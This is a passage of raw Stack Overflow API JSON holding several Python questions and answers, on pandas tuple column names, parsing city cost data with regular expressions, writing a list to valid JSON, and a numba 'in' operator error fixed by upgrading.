7, "last_activity_date": 1474048167, "creation_date": 1462997326, "last_edit_date": 1474048167, "question_id": 37172354, "link": "https://stackoverflow.com/questions/37172354/pandas-loc-with-tuple-column-names", "title": "Pandas .loc with Tuple column names", "body": "<p>I am currently working with a panda that uses tuples for column names.  When attempting to use .loc as I would for normal columns the tuple names cause it to error out.</p>\n\n<p>Test code is below:</p>\n\n<pre><code>import pandas as pd\nimport numpy as np\ndf1 = pd.DataFrame(np.random.randn(6,4),\n                   columns=[('a','1'), ('b','2'), ('c','3'), 'nontuple'])\ndf1.loc[:3, 'nontuple']\ndf1.loc[:3, ('c','3')]\n</code></pre>\n\n<p>The second line works as expected and displays the column 'non tuple' from 0:3.  The third line does not work and instead gives the error:</p>\n\n<blockquote>\n  <p>KeyError: \"None of [('c', '3')] are in the [columns]</p>\n</blockquote>\n\n<p>Any idea how to resolve this issue short of not using tuples as column names?</p>\n\n<p>Also, I have found that the code below works even though the .loc doesn't:</p>\n\n<pre><code>df1.ix[:3][('c','3')]\n</code></pre>\n"}, {"tags": ["python", "numpy"], "comments": [{"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1462997497, "post_id": 37172330, "comment_id": 61879423, "body": "@AlexHall the <code>1</code> is a link to an image."}, {"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 3, "creation_date": 1462997638, "post_id": 37172330, "comment_id": 61879490, "body": "How is your data table saved? It would probably be easier to use <a href=\"https://stackoverflow.com/questions/tagged/pandas\">pandas</a> to parse the file then numpy."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 1, "creation_date": 1462997778, "post_id": 37172330, "comment_id": 61879568, "body": "Your question is not clear. In what format(s) do you need to read data from, and in what formats do you need to write them?"}, {"owner": {"reputation": 11, "user_id": 4052156, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1814126506/picture?type=large", "display_name": "Juan Sebastian Eljach", "link": "https://stackoverflow.com/users/4052156/juan-sebastian-eljach"}, "edited": false, "score": 0, "creation_date": 1462998029, "post_id": 37172330, "comment_id": 61879714, "body": "My data table is saved in a txt with the format below the image. I need to read the data with that format and work whit it into my script. But I need to separate by city and work with every single city. Sorry if you dont understand me well. My english is not so good"}, {"owner": {"reputation": 173469, "user_id": 901925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bbd70aaeb3a97d0087daf93c2be8804?s=128&d=identicon&r=PG", "display_name": "hpaulj", "link": "https://stackoverflow.com/users/901925/hpaulj"}, "edited": false, "score": 0, "creation_date": 1463000627, "post_id": 37172330, "comment_id": 61881074, "body": "With the table image and file sample the question is fairly clear.  The primary task is to load a list (or lists) of names and numbers.  Once read and parse, it is easy to arrange things into arrays.  Can there be spaces in the names?  It&#39;s the mix of commas and spaces as delimiters that gives stock readers like <code>loadtxt</code> problems."}], "answers": [{"comments": [{"owner": {"reputation": 16763, "user_id": 2749397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/rcNMz.png?s=128&g=1", "display_name": "gboffi", "link": "https://stackoverflow.com/users/2749397/gboffi"}, "edited": false, "score": 1, "creation_date": 1462999092, "post_id": 37172628, "comment_id": 61880286, "body": "<code>line = &#39;Santa Rosa de Cabal 20 15,18 40 50 60,77 37 45</code> \u2014 <a href=\"https://en.wikipedia.org/wiki/Santa_Rosa_de_Cabal\" rel=\"nofollow noreferrer\">Santa Rosa de Cabal</a> is a town and municipality in the Risaralda Department, of west central Colombia..."}, {"owner": {"reputation": 173469, "user_id": 901925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8bbd70aaeb3a97d0087daf93c2be8804?s=128&d=identicon&r=PG", "display_name": "hpaulj", "link": "https://stackoverflow.com/users/901925/hpaulj"}, "edited": false, "score": 0, "creation_date": 1463000712, "post_id": 37172628, "comment_id": 61881116, "body": "I agree, regular expression is the most powerful way of splitting these lines, especially if there are spaces in the names."}, {"owner": {"reputation": 11, "user_id": 4052156, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1814126506/picture?type=large", "display_name": "Juan Sebastian Eljach", "link": "https://stackoverflow.com/users/4052156/juan-sebastian-eljach"}, "edited": false, "score": 0, "creation_date": 1463004009, "post_id": 37172628, "comment_id": 61882623, "body": "It worked perfect!. How Would you find what is the most expensive phase of a city?"}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463004225, "post_id": 37172628, "comment_id": 61882717, "body": "Austin&#39;s answer has the general idea. Try combining that with this answer. If you get stuck post a new question showing your efforts and what goes wrong."}], "tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 3, "last_activity_date": 1463000605, "last_edit_date": 1463000605, "creation_date": 1462998263, "answer_id": 37172628, "question_id": 37172330, "link": "https://stackoverflow.com/questions/37172330/reading-data-from-files-in-python-with-intelligent-format/37172628#37172628", "title": "Reading data from files in python with intelligent format", "body": "<pre><code>import re\nline = 'Santa Rosa de Cabal 20 15,18 40 50 60,77 37 45'\ncity, phase1, phase2, phase3 = re.match(\n    '(.+) (\\d+ \\d+),(\\d+ \\d+ \\d+ \\d+),(\\d+ \\d+ \\d+)', line).groups()\n\ndef tasks(phase_string):\n    return [int(task) for task in phase_string.split()]\n\nprint(city)\nfor phase in phase1, phase2, phase3:\n    print(tasks(phase))\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Santa Rosa de Cabal\n[20, 15]\n[18, 40, 50, 60]\n[77, 37, 45]\n</code></pre>\n\n<p>The main thing here is regular expressions. Read about them.</p>\n"}, {"comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463002213, "post_id": 37173465, "comment_id": 61881882, "body": "I had a similar approach but it was pointed out that the city name might have a space."}], "tags": [], "owner": {"reputation": 13033, "user_id": 4029014, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/ndZhu.jpg?s=128&g=1", "display_name": "aghast", "link": "https://stackoverflow.com/users/4029014/aghast"}, "is_accepted": false, "score": 0, "last_activity_date": 1463001508, "creation_date": 1463001508, "answer_id": 37173465, "question_id": 37172330, "link": "https://stackoverflow.com/questions/37172330/reading-data-from-files-in-python-with-intelligent-format/37173465#37173465", "title": "Reading data from files in python with intelligent format", "body": "<p>This is a simple parsing task, but you have to approach it in stages. First parse some, then for each bit parse a little more, etc.</p>\n\n<p>Try this:</p>\n\n<pre><code>#!python3\nimport io\n\nFile = \"\"\"Giron 20 15,18 40 50 60,77 37 45\nFloridablanca 17 13,17 35 43 55,67 39 46\nBogota 15 12,17 35 43 55,67 39 46\nCali 14 12,10 30 40 32,59 67 33\n\"\"\"\n\nCiudades = {}\n\nwith io.StringIO(File) as infile:\n    for line in infile:\n        if line.strip():\n            ciudad,costs = line.split(' ', 1)\n            Ciudades[ciudad] = fases = {}\n            for fase,tareacosts in enumerate(costs.split(',')):\n                fn = \"Fase {}\".format(fase)\n                fases[fn] = list(map(int, tareacosts.split(' ')))\n\nprint(\"Most expensive tarea in Bogota Fase 2 is:\",\n        max(Ciudades['Bogota']['Fase 2']))\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 4052156, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1814126506/picture?type=large", "display_name": "Juan Sebastian Eljach", "link": "https://stackoverflow.com/users/4052156/juan-sebastian-eljach"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1463001508, "creation_date": 1462997238, "last_edit_date": 1462998171, "question_id": 37172330, "link": "https://stackoverflow.com/questions/37172330/reading-data-from-files-in-python-with-intelligent-format", "title": "Reading data from files in python with intelligent format", "body": "<p>I have this data table:</p>\n\n<p><img src=\"https://i.stack.imgur.com/JIwon.png\" alt=\"enter image description here\"></p>\n\n<p>Ciudad means City, Fase means Phase and Tarea mins Task</p>\n\n<p>The data table is saved into a file with this format:</p>\n\n<pre><code>Giron 20 15,18 40 50 60,77 37 45\nFloridablanca 17 13,17 35 43 55,67 39 46\nBogota 15 12,17 35 43 55,67 39 46\nCali 14 12,10 30 40 32,59 67 33\n</code></pre>\n\n<p>The numbers means millions (20 Million, 18 million, etc.) </p>\n\n<p><strong>Each city is a line. Phases are delimited by \",\" and tasks are delimited by space</strong></p>\n\n<p>I need to read this file from python and be able to work with the tasks and phases of every single city, calculate what is the more expensive tasks in a city, the most expensive phase, etc.</p>\n\n<p>The problem is that I dont really know how to read and save the data in order to start to calculate what I need to calculate</p>\n\n<p>I have been trying with 1d-arrays and 2d-arrays with Numpy (loadtxt, genfromtxt), but the data output is not so clear and I can't figure out how to work with it</p>\n"}, {"tags": ["python", "json", "list"], "comments": [{"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 0, "creation_date": 1462997150, "post_id": 37172252, "comment_id": 61879267, "body": "<code>json_data = [] ... json_data.append(data) ... json.dump(json_data, outfile)</code> if you want a list in json data then make a list in json data!"}, {"owner": {"reputation": 61, "user_id": 6282963, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1007161296004957/picture?type=large", "display_name": "Fawad", "link": "https://stackoverflow.com/users/6282963/fawad"}, "reply_to_user": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 0, "creation_date": 1462998506, "post_id": 37172252, "comment_id": 61879972, "body": "Thanks for your comment. I followed your method and I got the result like this [{&quot;key0&quot;: &quot;a&quot;}][{&quot;key0&quot;: &quot;a&quot;}, {&quot;key1&quot;: &quot;b&quot;}][{&quot;key0&quot;: &quot;a&quot;}, {&quot;key1&quot;: &quot;b&quot;}, {&quot;key2&quot;: &quot;c&quot;}][{&quot;key0&quot;: &quot;a&quot;}, {&quot;key1&quot;: &quot;b&quot;}, {&quot;key2&quot;: &quot;c&quot;}, {&quot;key3&quot;: &quot;d&quot;}]"}, {"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 0, "creation_date": 1463000464, "post_id": 37172252, "comment_id": 61880995, "body": "could you show what you want the correct output to be?"}], "answers": [{"tags": [], "owner": {"reputation": 71409, "user_id": 3125566, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QcWOt.jpg?s=128&g=1", "display_name": "Moses Koledoye", "link": "https://stackoverflow.com/users/3125566/moses-koledoye"}, "is_accepted": false, "score": 1, "last_activity_date": 1462997660, "last_edit_date": 1462997660, "creation_date": 1462997347, "answer_id": 37172360, "question_id": 37172252, "link": "https://stackoverflow.com/questions/37172252/converting-a-list-to-json-in-python/37172360#37172360", "title": "Converting a list to json in python", "body": "<pre><code> data = []\n for entry in lst:\n    data.append({'key'+str(lst.index(entry)):entry})\n\n json.dump(data, outfile)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 308, "user_id": 4754913, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d1761327a7ddb0260a880445ae282fbd?s=128&d=identicon&r=PG&f=1", "display_name": "ajays20078", "link": "https://stackoverflow.com/users/4754913/ajays20078"}, "is_accepted": false, "score": 0, "last_activity_date": 1462997562, "creation_date": 1462997562, "answer_id": 37172423, "question_id": 37172252, "link": "https://stackoverflow.com/questions/37172252/converting-a-list-to-json-in-python/37172423#37172423", "title": "Converting a list to json in python", "body": "<p>Here is what you need to do:</p>\n\n<pre><code>mydict = {}\ni = 0\nfor entry in list:\n  dict_key = \"key\" + str(i)\n  mydict[dict_key] = entry\n  i = i + 1\njson.dump(mydict, outfile)\n</code></pre>\n\n<p>Currently you are creating a new dict entry in every iteration of the loop , hence the result is not a valid json.</p>\n"}, {"comments": [{"owner": {"reputation": 64040, "user_id": 3620003, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QnqtZ.jpg?s=128&g=1", "display_name": "timgeb", "link": "https://stackoverflow.com/users/3620003/timgeb"}, "reply_to_user": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 0, "creation_date": 1463000278, "post_id": 37172425, "comment_id": 61880902, "body": "OP&#39;s format it not valid JSON, this is my suggestion for valid JSON."}, {"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 0, "creation_date": 1463000397, "post_id": 37172425, "comment_id": 61880961, "body": "I was under the impression the op wanted something like <code>[{&#39;key0&#39;: &#39;a&#39;}, {&#39;key1&#39;: &#39;b&#39;}, {&#39;key2&#39;: &#39;c&#39;}, {&#39;key3&#39;: &#39;d&#39;}]</code> but now realize that it may not the desired behaviour..."}, {"owner": {"reputation": 61, "user_id": 6282963, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1007161296004957/picture?type=large", "display_name": "Fawad", "link": "https://stackoverflow.com/users/6282963/fawad"}, "edited": false, "score": 0, "creation_date": 1463086377, "post_id": 37172425, "comment_id": 61926807, "body": "Thanks @timgeb. Why are the values in reverse order? How they can be according to the order as in lst?"}, {"owner": {"reputation": 64040, "user_id": 3620003, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QnqtZ.jpg?s=128&g=1", "display_name": "timgeb", "link": "https://stackoverflow.com/users/3620003/timgeb"}, "reply_to_user": {"reputation": 61, "user_id": 6282963, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1007161296004957/picture?type=large", "display_name": "Fawad", "link": "https://stackoverflow.com/users/6282963/fawad"}, "edited": false, "score": 0, "creation_date": 1463122932, "post_id": 37172425, "comment_id": 61938323, "body": "@Fawad dictionaries and the JSON format don&#39;t have a concept of order. It&#39;s just coincidence that the keys appear reversed."}], "tags": [], "owner": {"reputation": 64040, "user_id": 3620003, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QnqtZ.jpg?s=128&g=1", "display_name": "timgeb", "link": "https://stackoverflow.com/users/3620003/timgeb"}, "is_accepted": false, "score": 1, "last_activity_date": 1462997570, "creation_date": 1462997570, "answer_id": 37172425, "question_id": 37172252, "link": "https://stackoverflow.com/questions/37172252/converting-a-list-to-json-in-python/37172425#37172425", "title": "Converting a list to json in python", "body": "<p>Enumerate your list (which you should not call <code>list</code>, by the way, you will shadow the built in list):</p>\n\n<pre><code>&gt;&gt;&gt; import json\n&gt;&gt;&gt; lst = ['a', 'b', 'c', 'd']\n&gt;&gt;&gt; jso = {'key{}'.format(k):v for k, v in enumerate(lst)}\n&gt;&gt;&gt; json.dumps(jso)\n'{\"key3\": \"d\", \"key2\": \"c\", \"key1\": \"b\", \"key0\": \"a\"}'\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 61, "user_id": 6282963, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1007161296004957/picture?type=large", "display_name": "Fawad", "link": "https://stackoverflow.com/users/6282963/fawad"}, "edited": false, "score": 0, "creation_date": 1463000716, "post_id": 37173164, "comment_id": 61881118, "body": "Thank you very much. It helps a lot as a beginner."}], "tags": [], "owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "is_accepted": false, "score": 1, "last_activity_date": 1463000278, "creation_date": 1463000278, "answer_id": 37173164, "question_id": 37172252, "link": "https://stackoverflow.com/questions/37172252/converting-a-list-to-json-in-python/37173164#37173164", "title": "Converting a list to json in python", "body": "<p>As a minimal change which I originally posted in a comment:</p>\n\n<pre><code>outfile = open('c:\\\\users\\\\fawads\\desktop\\csd\\\\Test44.json','w')#writing data to file\nall_data = [] #keep a list of all the entries\ni = 0\nfor entry in list:\n    data={'key'+str(i):entry}\n    i+=1\n    all_data.append(data) #add the data to the list\n\njson.dump(all_data,outfile) #write the list to the file\n\noutfile.close()\n</code></pre>\n\n<p>calling <code>json.dump</code> on the same file multiple times is very rarely useful as it creates multiple segments of json data that needs to be seperated in order to be parsed, it makes much more sense to only call it <strong>once</strong> when you are done constructing the data.</p>\n\n<p>I'd also like to suggest you use <code>enumerate</code> to handle the <code>i</code> variable as well as using a <code>with</code> statement to deal wit the file IO:</p>\n\n<pre><code>all_data = [] #keep a list of all the entries\nfor i,entry in enumerate(list):\n    data={'key'+str(i):entry}\n    all_data.append(data)\n\nwith open('c:\\\\users\\\\fawads\\desktop\\csd\\\\Test44.json','w') as outfile:\n    json.dump(all_data,outfile)\n#file is automatically closed at the end of the with block (even if there is an e\n</code></pre>\n\n<p>The loop could be shorted even further with list comprehension:</p>\n\n<pre><code>all_data = [{'key'+str(i):entry}\n            for i,entry in enumerate(list)]\n</code></pre>\n\n<p>Which (if you really want) could be put directly into the <code>json.dump</code>:</p>\n\n<pre><code>with open('c:\\\\users\\\\fawads\\desktop\\csd\\\\Test44.json','w') as outfile:\n    json.dump([{'key'+str(i):entry}\n                for i,entry in enumerate(list)],\n              outfile)\n</code></pre>\n\n<p>although then you start to lose readability so I don't recommend going that far.</p>\n"}], "owner": {"reputation": 61, "user_id": 6282963, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1007161296004957/picture?type=large", "display_name": "Fawad", "link": "https://stackoverflow.com/users/6282963/fawad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 195, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1463000278, "creation_date": 1462996932, "last_edit_date": 1462997335, "question_id": 37172252, "link": "https://stackoverflow.com/questions/37172252/converting-a-list-to-json-in-python", "title": "Converting a list to json in python", "body": "<p>Here is the code, I have a list, which I want to convert to JSON with dynamic keys.</p>\n\n<pre><code>&gt;&gt;&gt; print (list) #list\n['a', 'b', 'c', 'd']\n\n&gt;&gt;&gt; outfile = open('c:\\\\users\\\\fawads\\desktop\\csd\\\\Test44.json','w')#writing data to file\n&gt;&gt;&gt; for entry in list:\n...    data={'key'+str(i):entry}\n...    i+=1\n...    json.dump(data,outfile)\n...\n&gt;&gt;&gt; outfile.close()\n</code></pre>\n\n<p>The result is as following:</p>\n\n<pre><code>{\"key0\": \"a\"}{\"key1\": \"b\"}{\"key2\": \"c\"}{\"key3\": \"d\"}\n</code></pre>\n\n<p>Which is not valid json.</p>\n"}, {"tags": ["python", "numba"], "comments": [{"owner": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "edited": false, "score": 0, "creation_date": 1462996883, "post_id": 37172144, "comment_id": 61879120, "body": "Unable to reproduce your error using python3.4 or python2.7 using numba v0.25. What numba version are you using?"}, {"owner": {"reputation": 8790, "user_id": 668624, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/qMFcJ.jpg?s=128&g=1", "display_name": "codingknob", "link": "https://stackoverflow.com/users/668624/codingknob"}, "reply_to_user": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "edited": false, "score": 0, "creation_date": 1462997218, "post_id": 37172144, "comment_id": 61879301, "body": "numba 0.19.1 (came with my anaconda)"}, {"owner": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "edited": false, "score": 0, "creation_date": 1462997435, "post_id": 37172144, "comment_id": 61879399, "body": "Think you need &gt;0.21 <a href=\"https://github.com/pitrou/numba/blob/b3a79786799b5ceb0d4e6f08c21d04a51e77ec2a/CHANGE_LOG\" rel=\"nofollow noreferrer\">Changelog 0.21: Handle the <code>in</code> operator in object mode</a>"}, {"owner": {"reputation": 8790, "user_id": 668624, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/qMFcJ.jpg?s=128&g=1", "display_name": "codingknob", "link": "https://stackoverflow.com/users/668624/codingknob"}, "reply_to_user": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "edited": false, "score": 0, "creation_date": 1462999166, "post_id": 37172144, "comment_id": 61880336, "body": "Ah, yes. You are correct. I updated via conda. Seems to be working now. Thank you!!"}], "answers": [{"tags": [], "owner": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "is_accepted": true, "score": 1, "last_activity_date": 1462999571, "creation_date": 1462999571, "answer_id": 37172977, "question_id": 37172144, "link": "https://stackoverflow.com/questions/37172144/numba-notimplementederror-unknown-operator-in/37172977#37172977", "title": "numba NotImplementedError: Unknown operator &#39;in&#39;", "body": "<p>For anyone else stumbling on this error:</p>\n\n<p>It seems like the <code>in</code> operator is not fully implemented before <code>numba</code> version 0.21 <a href=\"https://github.com/pitrou/numba/blob/b3a79786799b5ceb0d4e6f08c21d04a51e77ec2a/CHANGE_LOG\" rel=\"nofollow\">see changelog</a>. Problem does not occur once <code>numba</code> is updated. </p>\n"}], "owner": {"reputation": 8790, "user_id": 668624, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/qMFcJ.jpg?s=128&g=1", "display_name": "codingknob", "link": "https://stackoverflow.com/users/668624/codingknob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 459, "favorite_count": 0, "accepted_answer_id": 37172977, "answer_count": 1, "score": 0, "last_activity_date": 1462999571, "creation_date": 1462996594, "last_edit_date": 1462997023, "question_id": 37172144, "link": "https://stackoverflow.com/questions/37172144/numba-notimplementederror-unknown-operator-in", "title": "numba NotImplementedError: Unknown operator &#39;in&#39;", "body": "<pre><code>from numba import jit\nfrom numpy import arange\n\n# jit decorator tells Numba to compile this function.\n# The argument types will be inferred by Numba when function is called.\n@jit\ndef sum2d(arr,m):\n    M, N = arr.shape\n    result = 0.0\n    if m in ['yes']:\n        for i in range(M):\n            for j in range(N):\n                result += arr[i,j]\n    return result\n\na = arange(9).reshape(3,3)\n</code></pre>\n\n<p>Execution results in an error. Question: is the <code>'in'</code> operator supported by <code>numba</code> and if not can I work around this? </p>\n\n<pre><code>print(sum2d(a,'yes'))\n</code></pre>\n\n<p><strong>Update:</strong></p>\n\n<pre><code>import cpkg_resources\nenv = pkg_resources.Environment()\nenv['numba'][0]\nnumba 0.19.1 (/Users/blah/anaconda/lib/python2.7/site-packages)\n</code></pre>\n\n<hr>\n\n<pre><code>LoweringError                             Traceback (most recent call last)\n&lt;ipython-input-4-1100b95cf735&gt; in &lt;module&gt;()\n----&gt; 1 print(sum2d(a,'yes'))\n\n/Users/blah/anaconda/lib/python2.7/site-packages/numba/dispatcher.pyc in _compile_for_args(self, *args, **kws)\n    163         assert not kws\n    164         sig = tuple([self.typeof_pyval(a) for a in args])\n--&gt; 165         return self.compile(sig)\n    166 \n    167     def inspect_llvm(self, signature=None):\n\n/Users/blah/anaconda/lib/python2.7/site-packages/numba/dispatcher.pyc in compile(self, sig)\n    301                                           self.py_func,\n    302                                           args=args, return_type=return_type,\n--&gt; 303                                           flags=flags, locals=self.locals)\n    304 \n    305             # Check typing error if object mode is used\n\n/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.pyc in compile_extra(typingctx, targetctx, func, args, return_type, flags, locals, library)\n    593     pipeline = Pipeline(typingctx, targetctx, library,\n    594                         args, return_type, flags, locals)\n--&gt; 595     return pipeline.compile_extra(func)\n    596 \n    597 \n\n/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.pyc in compile_extra(self, func)\n    316                 raise e\n    317 \n--&gt; 318         return self.compile_bytecode(bc, func_attr=self.func_attr)\n    319 \n    320     def compile_bytecode(self, bc, lifted=(), lifted_from=None,\n\n/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.pyc in compile_bytecode(self, bc, lifted, lifted_from, func_attr)\n    325         self.lifted_from = lifted_from\n    326         self.func_attr = func_attr\n--&gt; 327         return self._compile_bytecode()\n    328 \n    329     def compile_internal(self, bc, func_attr=DEFAULT_FUNCTION_ATTRIBUTES):\n\n/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.pyc in _compile_bytecode(self)\n    580 \n    581         pm.finalize()\n--&gt; 582         return pm.run(self.status)\n    583 \n    584 \n\n/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.pyc in run(self, status)\n    207                     # No more fallback pipelines?\n    208                     if is_final_pipeline:\n--&gt; 209                         raise patched_exception\n    210                     # Go to next fallback pipeline\n    211                     else:\n\nLoweringError: Caused By:\nTraceback (most recent call last):\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 201, in run\n    res = stage()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 393, in stage_objectmode_frontend\n    cres = self.frontend_looplift()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 384, in frontend_looplift\n    func_attr=self.func_attr)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 604, in compile_bytecode\n    return pipeline.compile_bytecode(bc=bc, lifted=lifted, lifted_from=lifted_from, func_attr=func_attr)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 327, in compile_bytecode\n    return self._compile_bytecode()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 582, in _compile_bytecode\n    return pm.run(self.status)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 209, in run\n    raise patched_exception\nLoweringError: Caused By:\nTraceback (most recent call last):\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 201, in run\n    res = stage()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 515, in stage_objectmode_backend\n    res = self._backend(lowerfn, objectmode=True)\n  File 